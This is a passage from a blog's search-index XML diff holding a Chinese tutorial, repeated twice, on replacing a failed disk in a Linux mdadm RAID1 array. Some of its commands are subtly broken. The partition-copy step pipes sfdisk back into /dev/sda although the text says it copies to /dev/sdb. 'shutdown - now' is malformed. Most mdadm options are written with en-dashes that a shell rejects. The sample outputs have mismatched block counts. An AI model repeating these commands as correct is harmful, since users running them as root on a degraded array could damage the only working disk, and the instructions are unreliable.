+        <content type="html"><![CDATA[<p>raid1 更换故障硬盘处理过程：<br> 1.服务器两个硬盘/dev/sda 和/dev/sdb组成raid1,结构如下<br>   /dev/sda1+/dev/sdb1=/dev/md0<br>   /dev/sda2+/dev/sdb2=/dev/md1<br>  现在通过cat /proc/mdstat发现/dev/sdb不正常，需要更换<br> 2.先在系统移除/dev/sdb,操作时需要先移除/dev/sdb的每一个分区<br>   a.移除/dev/sdb1<br>     先标记/dev/sdb1为fail<br>         [root@servera~]#mdadm –manage /dev/md0 –fail /dev/sdb1<br>     这时输入cat /proc/mdstat 应该可以看到以下信息<br>          Personalities:[linear][multipath][raid0][raid1][raid5][raid4][[raid6][raid10]<br>          md0:active raid1 sda1[0] sdb1<a href="F">2</a><br>              24418688 block [2/][U_]<br>          md1:active raid1 sda2[0] sdb2[1]<br>              24418688 blocks [2/2][UU]<br>          unused devices:<none><br><a id="more"></a><br>移除/dev/sdb1<br>     [root@servera~]#mdadm –manage /dev/md0 –remove /dev/sdb1<br>这时系统返回的结果应该是<br>     mdadm:hot removed /dev/sdb1<br>这时输入cat /proc/mdstat 应该可以看到以下信息<br>     Personalitie:[linear][multipath][raid0][raid1][raid5][raid4][raid6][raid10]<br>     md0:active raid1 sda1[0]<br>     244186688?blocks [2/1][U_]</none></p><pre><code>md1:active raid1 sda2[0] sdb2[1]244186688?blocks [2/2][UU]unused devices:&lt;none&gt;</code></pre><p>   b.用相同方法移除/dev/sdb2<br>     [root@servera~]#mdadm –manage /dev/md1 –fail /dev/sdb2<br>     [root@servera~]#cat /proc/mdstat</p><pre><code>    Personalities:[linear][multipath][raid0][raid1][raid5][raid4][[raid6][raid10]    md0:active raid1 sda1[0]    24418688 blocks [2/1][U_]    md1:active raid1 sda2[0] sdb2[2](F)    24418688 blocks [2/1][U_]    unused devices:&lt;none&gt;[root@servera~]#mdadm --manage /dev/md1 --remove /dev/sdb2 mdadm:hot removed /dev/sdb2[root@servera~]#cat /proc/mdstatPersonalities :[linear][multipath][raid0][raid1][raid5][raid4][raid6][raid10]md0:active raid1 sda1[0]     24418688 blocks [2/1][U_]unused devices:&lt;none&gt;s这时可以看到只有/dev/sda 在工作。</code></pre><p>3.关机<br>   {root@servera~}#shutdown - now<br>4.将硬盘/dev/sdb更换为新的硬盘，开机<br>5.系统启动完成以后，给新硬盘/dev/sdb做与/dev/sda相同的分区，可以用下面的命令完成<br>     [root@servera~]#sfdisk -d /dev/sda | sfdisk /dev/sda<br>      上面的命令表示从/dev/sda复制分区表至/dev/sdb.<br>      然后可以输入fdisk -l 查看两个硬盘分区是否相同<br>6.然后把/dev/sdb的分区挂到raid1里面<br>      [root@servera~]#mdadm –manage /dev/md0 –add /dev/sdb1<br>       系统应该返回mdadm:re-added /dev/sdb1<br>      [root@servera~]#mdadm –manage /dev/md1 –add /dev/sdb2<br>      系统使用cat /proc/mdstat 查看结果<br>      Personalities:[linear][multipath][raid0][raid1][raid5][raid4][raid6][raid10]<br>      md0:active raid1 sda1[0] sdb1[1]<br>          2418688 blocks [2/1][U_]<br>          [=&gt;…………] recovery = 9.9% (2423168/24428688) finish=2.8min<br>      speed=127535K/sec<br>      md1:active raid1 sda2[0] sdb2[1]<br>          24418688 blocks [2/1][U_]<br>          [=&gt;…………] recovery = 6.4% (1572096//24418688) finish=1.9min<br>      speed=196512K/sec<br>      unused devices:<none><br>      When the synchronization is finished,the output will look like this:<br>      server1：~#cat /proc/mdstat<br>      Personalities:[linear][multipath][raid0][raid5][raid4][raid6][raid10]<br>      md0:active raid1 sda1[0] sdb1[1]<br>          24418688 blocks [2/2][UU]<br>      md1:active raid1 sda2[0] sdb2[1]<br>          24418688 blocks [2/2][UU]<br>      unused devices:<none><br>至此大功告成啦，慢慢等系统自动同步数据到/dev/sdb.</none></none></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Linux系统raid1更换故障硬盘处理过程</title>
+      <link href="/2018/08/11/linux/"/>
+      <url>/2018/08/11/linux/</url>
+      
+        <content type="html"><![CDATA[<p>raid1 更换故障硬盘处理过程：<br> 1.服务器两个硬盘/dev/sda 和/dev/sdb组成raid1,结构如下<br>   /dev/sda1+/dev/sdb1=/dev/md0<br>   /dev/sda2+/dev/sdb2=/dev/md1<br>  现在通过cat /proc/mdstat发现/dev/sdb不正常，需要更换<br> 2.先在系统移除/dev/sdb,操作时需要先移除/dev/sdb的每一个分区<br>   a.移除/dev/sdb1<br>     先标记/dev/sdb1为fail<br>         [root@servera~]#mdadm –manage /dev/md0 –fail /dev/sdb1<br>     这时输入cat /proc/mdstat 应该可以看到以下信息<br>          Personalities:[linear][multipath][raid0][raid1][raid5][raid4][[raid6][raid10]<br>          md0:active raid1 sda1[0] sdb1<a href="F">2</a><br>              24418688 block [2/][U_]<br>          md1:active raid1 sda2[0] sdb2[1]<br>              24418688 blocks [2/2][UU]<br>          unused devices:<none><br><a id="more"></a><br>移除/dev/sdb1<br>     [root@servera~]#mdadm –manage /dev/md0 –remove /dev/sdb1<br>这时系统返回的结果应该是<br>     mdadm:hot removed /dev/sdb1<br>这时输入cat /proc/mdstat 应该可以看到以下信息<br>     Personalitie:[linear][multipath][raid0][raid1][raid5][raid4][raid6][raid10]<br>     md0:active raid1 sda1[0]<br>     244186688?blocks [2/1][U_]</none></p><pre><code>md1:active raid1 sda2[0] sdb2[1]244186688?blocks [2/2][UU]unused devices:&lt;none&gt;</code></pre><p>   b.用相同方法移除/dev/sdb2<br>     [root@servera~]#mdadm –manage /dev/md1 –fail /dev/sdb2<br>     [root@servera~]#cat /proc/mdstat</p><pre><code>    Personalities:[linear][multipath][raid0][raid1][raid5][raid4][[raid6][raid10]    md0:active raid1 sda1[0]    24418688 blocks [2/1][U_]    md1:active raid1 sda2[0] sdb2[2](F)    24418688 blocks [2/1][U_]    unused devices:&lt;none&gt;[root@servera~]#mdadm --manage /dev/md1 --remove /dev/sdb2 mdadm:hot removed /dev/sdb2[root@servera~]#cat /proc/mdstatPersonalities :[linear][multipath][raid0][raid1][raid5][raid4][raid6][raid10]md0:active raid1 sda1[0]     24418688 blocks [2/1][U_]unused devices:&lt;none&gt;s这时可以看到只有/dev/sda 在工作。</code></pre><p>3.关机<br>   {root@servera~}#shutdown - now<br>4.将硬盘/dev/sdb更换为新的硬盘，开机<br>5.系统启动完成以后，给新硬盘/dev/sdb做与/dev/sda相同的分区，可以用下面的命令完成<br>     [root@servera~]#sfdisk -d /dev/sda | sfdisk /dev/sda<br>      上面的命令表示从/dev/sda复制分区表至/dev/sdb.<br>      然后可以输入fdisk -l 查看两个硬盘分区是否相同<br>6.然后把/dev/sdb的分区挂到raid1里面<br>      [root@servera~]#mdadm –manage /dev/md0 –add /dev/sdb1<br>       系统应该返回mdadm:re-added /dev/sdb1<br>      [root@servera~]#mdadm –manage /dev/md1 –add /dev/sdb2<br>      系统使用cat /proc/mdstat 查看结果<br>      Personalities:[linear][multipath][raid0][raid1][raid5][raid4][raid6][raid10]<br>      md0:active raid1 sda1[0] sdb1[1]<br>          2418688 blocks [2/1][U_]<br>          [=&gt;…………] recovery = 9.9% (2423168/24428688) finish=2.8min<br>      speed=127535K/sec<br>      md1:active raid1 sda2[0] sdb2[1]<br>          24418688 blocks [2/1][U_]<br>          [=&gt;…………] recovery = 6.4% (1572096//24418688) finish=1.9min<br>      speed=196512K/sec<br>      unused devices:<none><br>      When the synchronization is finished,the output will look like this:<br>      server1：~#cat /proc/mdstat<br>      Personalities:[linear][multipath][raid0][raid5][raid4][raid6][raid10]<br>      md0:active raid1 sda1[0] sdb1[1]<br>          24418688 blocks [2/2][UU]<br>      md1:active raid1 sda2[0] sdb2[1]<br>          24418688 blocks [2/2][UU]<br>      unused devices:<none><br>至此大功告成啦，慢慢等系统自动同步数据到/dev/sdb.</none></none></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
